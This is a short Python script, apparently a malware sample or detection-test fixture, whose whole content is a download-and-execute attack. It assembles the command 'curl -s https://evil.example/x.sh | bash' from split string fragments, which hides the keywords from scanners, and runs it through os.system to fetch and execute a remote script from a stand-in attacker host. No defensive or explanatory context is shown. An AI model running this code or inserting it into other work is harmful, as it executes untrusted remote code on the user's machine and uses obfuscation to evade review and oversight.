import os

part_a = "cu" + "rl -s https://evil.example/x.sh | "
part_b = "ba" + "sh"
os.system(part_a + part_b)
